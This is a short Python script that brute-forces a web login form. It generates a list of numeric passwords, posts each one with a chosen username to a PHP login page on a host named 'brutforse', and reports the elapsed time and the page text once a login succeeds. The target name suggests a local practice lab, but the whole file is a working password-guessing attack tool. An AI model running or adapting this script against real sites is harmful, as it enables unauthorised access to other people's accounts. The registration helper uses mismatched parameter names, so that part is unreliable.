import requests
import time
from bs4 import BeautifulSoup

def CreatePasswords():
    f = open("pwords.txt", "w")
    for i in range(0, 100000):
        f.write(str(i) + "\n")

class Bruteforcer:
    ROOT = "http://brutforse/"
    ResText = None

    def Force(self, name, filename):
        START = time.time()
        f = open(filename, "r")
        for password in f:

            password = password.replace("\n", "")
            print("Current password value: ", password)
            print("Time spent", time.time() - START)

            self.auth(name, password)
            if self.ResText is not None:
                FINISH = time.time()
                return FINISH - START
        return -1

    def auth(self, user_name, password):

        session = requests.Session()
        url = self.ROOT + "index.php"
        params = {'btn_log': '1', "input_name": user_name, "input_password": password}
        try:
            r = session.post(url, params)
        except requests.exceptions.ConnectionError:
            pass
        if r.url != "http://brutforse/index.php":
            soup = BeautifulSoup(r.text, 'html.parser')
            self.ResText = soup.p.get_text()

    def SignUp(self, user_name, password):
        session = requests.Session()
        url = self.ROOT + "register.php"
        params = {'btn log': '1', "input name": user_name, "input password": password}
        session.post(url, params)

def run():
    forcer = Bruteforcer()
    key = None

    CreatePasswords()

    while key != "exit":
        print(
            "1 - Password guessing.\n"
            "Exit - Exit.")
        key = input()
        if key == '1':
            name = input("Enter username: ")
            filename = input("Enter a file name with passwords: ")
            t = forcer.Force(name, filename)

            if forcer.ResText is not None:
                print("\nSuccess!\nTime spent on selection: ", t, "\n")
                print(forcer.ResText)
            else:
                print("\nPassword not found")


run()
